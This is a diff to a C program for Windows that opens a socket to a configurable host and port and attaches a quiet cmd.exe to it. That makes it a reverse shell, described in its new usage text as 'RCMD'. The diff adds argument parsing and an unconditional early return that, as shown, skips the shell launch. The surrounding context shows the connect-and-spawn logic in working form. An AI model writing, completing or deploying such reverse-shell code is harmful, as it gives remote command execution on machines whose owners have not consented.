@@ -8,7 +8,14 @@
 #define SERVER "127.0.0.1"
 #define PORT 1234
 
-SOCKET ConnectToServer() {
+char* USAGE =
+    "Starts a new instance of the windows command interpreter over a socket connection.\n"
+    "\n"
+    "  RCMD [host] [port]\n"
+    "  RCMD [\\L] [host] [port]";
+
+SOCKET ConnectToServer()
+{
     WSADATA wsaData;
     SOCKET clientSocket;
     struct sockaddr_in serverAddress;
@@ -40,13 +47,29 @@ SOCKET ConnectToServer() {
     return clientSocket;
 }
 
-int main() {
+int main(int argc, char* argv[])
+{
     STARTUPINFOA startupInfo;
     PROCESS_INFORMATION processInfo;
     SOCKET clientSocket;
 
+    for (int i = 1; i < argc; i++)
+    {
+        if (argv[i][0] == '/')
+        {
+            switch (argv[i][1])
+            {
+                case '?':
+                    printf("%s\n", USAGE);
+                    return 0;
+            }
+        }
+    }
+    return 0;
+
     clientSocket = ConnectToServer();
-    if (clientSocket == INVALID_SOCKET) {
+    if (clientSocket == INVALID_SOCKET)
+    {
         return 1;
     }
 
@@ -57,7 +80,8 @@ int main() {
     startupInfo.hStdOutput = (HANDLE)clientSocket;
     startupInfo.hStdError = (HANDLE)clientSocket;
 
-    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
+    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo))
+    {
         printf("Failed to create cmd.exe process.\n");
         closesocket(clientSocket);
         WSACleanup();
